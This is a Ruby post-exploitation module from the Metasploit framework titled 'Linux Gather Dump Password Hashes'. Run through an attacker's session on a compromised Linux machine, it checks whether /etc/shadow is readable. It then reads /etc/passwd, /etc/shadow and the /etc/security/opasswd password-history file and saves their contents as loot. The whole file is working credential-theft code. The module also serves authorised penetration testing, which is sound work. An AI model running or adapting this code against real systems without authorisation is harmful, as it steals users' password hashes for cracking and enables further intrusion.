##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Linux
  include Msf::Post::Linux::Priv

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Linux Gather Dump Password Hashes for Linux Systems',
        'Description' => %q{ Post Module to dump the password hashes for all users on a Linux System},
        'License' => MSF_LICENSE,
        'Author' => ['Carlos Perez <carlos_perez[at]darkoperator.com>'],
        'Platform' => ['linux'],
        'SessionTypes' => ['shell', 'meterpreter'],
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [],
          'Reliability' => []
        },
        'References' => [
          [ 'ATT&CK', Mitre::Attack::Technique::T1003_008_ETC_PASSWD_AND_ETC_SHADOW ]
        ]
      )
    )
  end

  # Run Method for when run command is issued
  def run
    unless readable?('/etc/shadow')
      fail_with Failure::NoAccess, 'Shadow file must be readable in order to dump hashes'
    end

    passwd_file = read_file('/etc/passwd')
    shadow_file = read_file('/etc/shadow')
    report_linux_hashdump(passwd_file, shadow_file)

    opasswd_file = read_file('/etc/security/opasswd')
    unless opasswd_file.nil?
      p = store_loot('linux.passwd.history', 'text/plain', session, opasswd_file, 'opasswd.tx', 'Linux Passwd History File')
      vprint_good("opasswd saved in: #{p}")
    end
  end
end
